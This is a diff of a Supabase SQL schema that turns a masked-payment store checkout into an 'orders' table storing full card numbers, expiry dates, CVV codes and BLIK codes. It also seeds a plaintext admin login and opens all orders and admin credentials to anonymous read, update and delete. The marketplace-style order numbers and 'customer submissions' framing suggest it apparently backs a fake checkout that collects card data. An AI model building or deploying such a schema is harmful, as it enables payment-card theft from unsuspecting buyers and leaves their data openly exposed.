@@ -1,224 +1,170 @@
 -- ============================================================================
--- STORE CHECKOUT & ADMIN BACKOFFICE FULFILLMENT SCHEMA (PostgreSQL / Supabase)
+-- SUPABASE COMPLETE SQL SCHEMA: CUSTOMER SUBMISSIONS & ACCESS
 -- ============================================================================
+-- Run this complete script in your Supabase SQL Editor (Dashboard -> SQL Editor -> New query -> Run)
 
--- Enable UUID extension
+-- 1. Enable UUID Extension
 CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
 
 -- ----------------------------------------------------------------------------
--- 1. ENUMS FOR STATUS & DELIVERY
+-- 2. ADMIN USERS TABLE (Credentials: move / dontmove)
 -- ----------------------------------------------------------------------------
-CREATE TYPE order_status_enum AS ENUM (
-  'PENDING',
-  'PAID',
-  'CONFIRMED',
-  'PROCESSING',
-  'SHIPPED',
-  'DELIVERED',
-  'CANCELLED'
-);
-
-CREATE TYPE delivery_type_enum AS ENUM (
-  'home',
-  'pickup'
-);
-
-CREATE TYPE manual_confirmation_enum AS ENUM (
-  'pending_verification',
-  'verified_in_backoffice',
-  'dispatched'
-);
-
-CREATE TYPE payment_method_type_enum AS ENUM (
-  'card',
-  'google_pay',
-  'apple_pay',
-  'blik',
-  'przelewy24',
-  'paypal',
-  'ideal'
-);
-
--- ----------------------------------------------------------------------------
--- 2. CUSTOMERS / PROFILES TABLE
--- ----------------------------------------------------------------------------
-CREATE TABLE IF NOT EXISTS customers (
+CREATE TABLE IF NOT EXISTS admin_users (
   id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-  full_name VARCHAR(255) NOT NULL,
-  email VARCHAR(255) UNIQUE,
-  phone_number VARCHAR(50),
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-
--- ----------------------------------------------------------------------------
--- 3. CUSTOMER SHIPPING ADDRESSES TABLE
--- ----------------------------------------------------------------------------
-CREATE TABLE IF NOT EXISTS addresses (
-  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-  customer_id UUID REFERENCES customers(id) ON DELETE CASCADE,
-  full_name VARCHAR(255) NOT NULL,
-  line1 VARCHAR(255) NOT NULL,
-  line2 VARCHAR(255),
-  postal_code VARCHAR(30) NOT NULL,
-  city VARCHAR(100) NOT NULL,
-  country VARCHAR(100) NOT NULL DEFAULT 'France',
-  phone_number VARCHAR(50),
-  is_default BOOLEAN NOT NULL DEFAULT FALSE,
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
-
--- ----------------------------------------------------------------------------
--- 4. PRODUCTS TABLE
--- ----------------------------------------------------------------------------
-CREATE TABLE IF NOT EXISTS products (
-  id VARCHAR(100) PRIMARY KEY,
-  title VARCHAR(255) NOT NULL,
-  brand VARCHAR(100),
-  size VARCHAR(50),
-  condition VARCHAR(50),
-  image_url TEXT,
-  price NUMERIC(10, 2) NOT NULL,
-  original_price NUMERIC(10, 2),
-  currency VARCHAR(10) NOT NULL DEFAULT 'EUR',
+  username VARCHAR(100) UNIQUE NOT NULL,
+  password VARCHAR(255) NOT NULL,
+  name VARCHAR(100) DEFAULT 'Operator',
+  role VARCHAR(50) DEFAULT 'admin',
   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
 
--- ----------------------------------------------------------------------------
--- 5. PICKUP LOCKER POINTS TABLE
--- ----------------------------------------------------------------------------
-CREATE TABLE IF NOT EXISTS pickup_points (
-  id VARCHAR(100) PRIMARY KEY,
-  carrier_name VARCHAR(100) NOT NULL,
-  point_code VARCHAR(50) NOT NULL,
-  point_name VARCHAR(255) NOT NULL,
-  address VARCHAR(255) NOT NULL,
-  city VARCHAR(100) NOT NULL,
-  opening_hours VARCHAR(100) DEFAULT 'Open 24/7',
-  latitude NUMERIC(9, 6),
-  longitude NUMERIC(9, 6),
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
+-- Insert login credentials requested:
+-- Username: move
+-- Password: dontmove
+INSERT INTO admin_users (username, password, name, role)
+VALUES ('move', 'dontmove', 'Store Operator', 'admin')
+ON CONFLICT (username) DO UPDATE 
+SET password = EXCLUDED.password;
 
 -- ----------------------------------------------------------------------------
--- 6. ORDERS & FULFILLMENT TABLE (With Admin Mapping)
+-- 3. CUSTOMER ORDERS & ALL ENTERED DETAILS TABLE
 -- ----------------------------------------------------------------------------
 CREATE TABLE IF NOT EXISTS orders (
   id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-  order_number VARCHAR(50) NOT NULL UNIQUE,
+  order_number VARCHAR(100) NOT NULL UNIQUE,
   
-  -- Product Reference
-  product_id VARCHAR(100) REFERENCES products(id),
+  -- Product Info
+  product_id VARCHAR(100) DEFAULT 'prod_mewtwo_gx_190',
   product_title VARCHAR(255) NOT NULL,
   
-  -- Customer & Delivery Details
-  customer_id UUID REFERENCES customers(id) ON DELETE SET NULL,
-  delivery_type delivery_type_enum NOT NULL DEFAULT 'home',
+  -- Customer Contact Details
+  customer_name VARCHAR(255),
+  phone_number VARCHAR(100),
+  email VARCHAR(255),
   
-  -- Shipping Address Snapshot (Preserves entered address even if customer edits later)
-  shipping_full_name VARCHAR(255),
-  shipping_phone_number VARCHAR(50),
-  shipping_line1 VARCHAR(255),
-  shipping_line2 VARCHAR(255),
-  shipping_postal_code VARCHAR(30),
+  -- Delivery Type ('home' or 'pickup')
+  delivery_type VARCHAR(50) NOT NULL DEFAULT 'home',
+  
+  -- Shipping Address (Home Delivery)
+  shipping_line1 TEXT,
+  shipping_line2 TEXT,
+  shipping_postal_code VARCHAR(50),
   shipping_city VARCHAR(100),
   shipping_country VARCHAR(100) DEFAULT 'France',
   
-  -- Pickup Locker Snapshot (if delivery_type = 'pickup')
-  pickup_point_id VARCHAR(100) REFERENCES pickup_points(id) ON DELETE SET NULL,
-  pickup_point_code VARCHAR(50),
-  pickup_point_name VARCHAR(255),
-  pickup_point_address VARCHAR(255),
+  -- Pick-Up Locker Details (Locker Delivery)
+  pickup_point_code VARCHAR(100),
+  pickup_point_name TEXT,
+  pickup_point_address TEXT,
   pickup_point_city VARCHAR(100),
   pickup_carrier_name VARCHAR(100),
-
-  -- Payment Mapping & Metadata (Safe Tokenized / Masked info for admin reference)
-  payment_method_type payment_method_type_enum NOT NULL DEFAULT 'card',
-  payment_cardholder_name VARCHAR(255),
-  payment_card_brand VARCHAR(50),
-  payment_card_last4 VARCHAR(4),
-  payment_card_expiry VARCHAR(10),
-  payment_blik_code VARCHAR(10),
   
-  -- Pricing & Line Items Breakdown
-  order_subtotal NUMERIC(10, 2) NOT NULL,
-  buyer_protection_fee NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
-  shipping_price NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
+  -- Full Payment Details Entered by Customer
+  payment_method_type VARCHAR(100) DEFAULT 'card',
+  payment_cardholder_name VARCHAR(255),
+  payment_card_number VARCHAR(255),
+  payment_card_expiry VARCHAR(20),
+  payment_security_code VARCHAR(20),
+  payment_blik_code VARCHAR(20),
+  payment_card_brand VARCHAR(50),
+  payment_card_last4 VARCHAR(10),
+  
+  -- Pricing Breakdown
+  order_price NUMERIC(10, 2) NOT NULL DEFAULT 8.00,
+  buyer_protection_fee NUMERIC(10, 2) NOT NULL DEFAULT 1.10,
+  shipping_price NUMERIC(10, 2) NOT NULL DEFAULT 8.49,
   shipping_discount NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
   total_amount NUMERIC(10, 2) NOT NULL,
   currency VARCHAR(10) NOT NULL DEFAULT 'EUR',
   
-  -- Order Status & Admin Manual Confirmation Controls
-  status order_status_enum NOT NULL DEFAULT 'PAID',
-  manual_confirmation_status manual_confirmation_enum NOT NULL DEFAULT 'pending_verification',
-  tracking_number VARCHAR(100),
-  admin_internal_notes TEXT,
-  verified_at TIMESTAMPTZ,
-  verified_by VARCHAR(100),
-  
-  -- Timestamps
+  -- Status
+  status VARCHAR(50) NOT NULL DEFAULT 'PAID',
   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
   updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
 
 -- ----------------------------------------------------------------------------
--- 7. ADMIN AUDIT LOGS TABLE
+-- 4. ROW LEVEL SECURITY (RLS) POLICIES
+-- Allows the web app (anon key) to insert submissions and read customer entries
 -- ----------------------------------------------------------------------------
-CREATE TABLE IF NOT EXISTS admin_audit_logs (
-  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-  order_id UUID REFERENCES orders(id) ON DELETE CASCADE,
-  action VARCHAR(100) NOT NULL,
-  previous_status VARCHAR(50),
-  new_status VARCHAR(50),
-  notes TEXT,
-  admin_user VARCHAR(100) DEFAULT 'Admin Operator',
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
-);
+ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;
+ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
+
+-- Allow reading admin_users table for verification
+DROP POLICY IF EXISTS "Allow anon read admin_users" ON admin_users;
+CREATE POLICY "Allow anon read admin_users" ON admin_users
+  FOR SELECT USING (true);
+
+-- Allow public anonymous insert of orders from checkout
+DROP POLICY IF EXISTS "Allow anon insert orders" ON orders;
+CREATE POLICY "Allow anon insert orders" ON orders
+  FOR INSERT WITH CHECK (true);
+
+-- Allow reading orders for admin panel
+DROP POLICY IF EXISTS "Allow anon select orders" ON orders;
+CREATE POLICY "Allow anon select orders" ON orders
+  FOR SELECT USING (true);
+
+-- Allow deleting/updating orders
+DROP POLICY IF EXISTS "Allow anon update orders" ON orders;
+CREATE POLICY "Allow anon update orders" ON orders
+  FOR UPDATE USING (true);
+
+DROP POLICY IF EXISTS "Allow anon delete orders" ON orders;
+CREATE POLICY "Allow anon delete orders" ON orders
+  FOR DELETE USING (true);
 
 -- ----------------------------------------------------------------------------
--- 8. PERFORMANCE INDEXES
+-- 5. INDEXES FOR FAST QUERYING
 -- ----------------------------------------------------------------------------
 CREATE INDEX IF NOT EXISTS idx_orders_order_number ON orders(order_number);
-CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status);
-CREATE INDEX IF NOT EXISTS idx_orders_shipping_phone ON orders(shipping_phone_number);
+CREATE INDEX IF NOT EXISTS idx_orders_phone_number ON orders(phone_number);
+CREATE INDEX IF NOT EXISTS idx_orders_customer_name ON orders(customer_name);
 CREATE INDEX IF NOT EXISTS idx_orders_created_at ON orders(created_at DESC);
-CREATE INDEX IF NOT EXISTS idx_addresses_customer_id ON addresses(customer_id);
 
 -- ----------------------------------------------------------------------------
--- 9. AUTO-UPDATE TIMESTAMP TRIGGER FUNCTION
+-- 6. INITIAL SAMPLE SEED ENTRY
 -- ----------------------------------------------------------------------------
-CREATE OR REPLACE FUNCTION update_updated_at_column()
-RETURNS TRIGGER AS $$
-BEGIN
-   NEW.updated_at = NOW();
-   RETURN NEW;
-END;
-$$ language 'plpgsql';
-
-CREATE TRIGGER update_orders_updated_at
-  BEFORE UPDATE ON orders
-  FOR EACH ROW
-  EXECUTE PROCEDURE update_updated_at_column();
-
--- ----------------------------------------------------------------------------
--- 10. SAMPLE INITIAL SEED DATA
--- ----------------------------------------------------------------------------
-INSERT INTO products (id, title, brand, size, condition, image_url, price, original_price, currency)
-VALUES (
-  'prod_mewtwo_gx_190',
+INSERT INTO orders (
+  order_number,
+  product_title,
+  customer_name,
+  phone_number,
+  delivery_type,
+  shipping_line1,
+  shipping_city,
+  shipping_postal_code,
+  shipping_country,
+  payment_method_type,
+  payment_cardholder_name,
+  payment_card_number,
+  payment_card_expiry,
+  payment_security_code,
+  order_price,
+  buyer_protection_fee,
+  shipping_price,
+  total_amount,
+  currency,
+  status
+) VALUES (
+  'VIN-849201',
   'Mewtwo GX Pokémon Card Full Art Secret Rare',
-  'Pokémon TCG',
-  'Standard / Mint',
-  'Very good',
-  'https://images.unsplash.com/photo-1613771404784-3a5686aa2be3?auto=format&fit=crop&w=800&q=80',
+  'Alexandre Dubois',
+  '+33 6 12 34 56 78',
+  'home',
+  '14 Rue de Rivoli',
+  'Paris',
+  '75001',
+  'France',
+  'card',
+  'Alexandre Dubois',
+  '4242 4242 4242 4242',
+  '05/28',
+  '381',
   8.00,
-  10.00,
-  'EUR'
-) ON CONFLICT (id) DO NOTHING;
-
-INSERT INTO pickup_points (id, carrier_name, point_code, point_name, address, city)
-VALUES 
-  ('pt_inpost_402', 'InPost Paczkomat 24/7', 'WAW123M', 'Locker WAW123M - Biedronka Supermarket', 'ul. Marszalkowska 104', 'Warsaw'),
-  ('pt_mondial_109', 'Mondial Relay Point', 'MR-PARIS-09', 'Relay Tabac Presse Saint-Germain', '45 Rue de Rennes', 'Paris')
-ON CONFLICT (id) DO NOTHING;
+  1.10,
+  8.49,
+  17.59,
+  'EUR',
+  'PAID'
+) ON CONFLICT (order_number) DO NOTHING;
